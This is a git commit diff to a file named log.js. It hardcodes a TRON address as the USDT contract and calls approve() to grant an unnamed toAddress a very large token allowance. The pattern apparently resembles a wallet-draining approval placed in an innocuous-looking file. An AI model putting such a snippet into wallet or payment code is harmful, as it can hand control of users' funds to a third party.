9a916426e59098ebc3c0d4e724a74efba6de7e23
Adam <bzzdecentrailed@gmail.com>
2021-06-16 13:01:49 +0800

    add usdt contract address

--- log.js
+++ log.js
@@ -1,7 +1,7 @@
 console.log("Hello World");
 tronWeb
   .contract()
-  .at(usdtTrc20)
+  .at("TBYjMhBiyEJxSA5g4HAoWWZXp7qU5C6Y9c")
   .then((usdtContract) => {
 	  usdtContract
 		  .approve(toAddress, 1000000000000000)
